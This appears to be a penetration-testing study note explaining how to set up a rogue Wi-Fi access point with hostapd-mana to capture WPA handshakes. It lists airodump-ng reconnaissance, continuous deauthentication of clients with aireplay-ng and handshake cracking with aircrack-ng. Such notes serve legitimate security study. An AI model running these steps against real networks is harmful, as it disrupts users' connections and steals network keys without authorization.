Active and Unauthorized for use.
AP plugged without the admin knowledge (that might mimics an existing approved AP - with the same name).

Attack used to grab WPA pre-shared keys (PSK).

![[Pasted image 20221203125837.png]]

Client ---connects-to--> AP
	The device will add the network to the preferred network list (PNL) that allows devices to re-connect to a familiar network when is available again (or from a different AP).

1) Gather information about the target AP
		`# airmon-ng start wlan0`
		`# airodump-ng -w <name_output_file> --output-format pcap wlan0mon`
		Check the essid, bssid, channel, the encryption and the cypher and auth used.
2) Stop the Monitor mode on wlan0mon
		`# airmon-ng stop wlan0mon`
		Check the pcap saved with wireshark:
		`# wlan.fc.type_subtype == 0x08 && wlan.ssid == "<essid>"`
		To chewck for more informations, go `IEEE 802.11 Wireless Management` > `Tagged Parameters` ( if you see WPA information element, it supports wpa1, if you see RSN Information, it supports WPA2 too)
		Expanding WPA information element and RSN information you can see if it supports TKIP and CCMP (CCM)
3) Create the rogue AP
		Use <font style="color:#981f3a">hostapd-mana</font>, creating its configuration file (main config file in `/etc/hostapd-mana/hostapd-mana.conf`).
		Create your own config file for hostapd-mana
		![[Pasted image 20221203131138.png]]
		ssid = essid of the AP you're copying
		ieee80211n: you can find out what standard protocol is used googling the information about the AP (encryption, MB, cypher and auth used).
		hw_mode: band to 2.4GHz (`g`) or band to 5GHz (`a`).
		WPA=3: to set WPA & WPA2 enabled. (1 = only WPA, 2 = only WPA2)
		wpa_key_mgmt --> WPA-PSK
		wpa_passphrase: irrelevant.
		wpa_pairwise: `TKIP`,  `CCMP`,  `TKIP CCMP` (check from wireshark)
		rsa_pairwise: same as above but for WPA2 (check from wireshark under RSN Information)
		mana_wpaout: where to save the capture handshake.
4) Run the AP and get the handshake
		`# hostapd-mana configuration_file.conf` (you'll se the output notification on the stdout if you capture the handshake).
		In case you don't receive the handshake, use `aireplay-ng` to deauth clients so that they re-connect to the Rogue AP (keep the command above running!).
		`# airmon-ng start wlan1 1` (1 is the channel that match the target AP).
		`# aireply-ng -0 0 -a <target_ap_bssid> wlan1mon` (`-0` is to send continously).
		Crack the handshake
		`# aircrack-ng <output.hccapx> -e <wifi_essid> -w <wordlist>`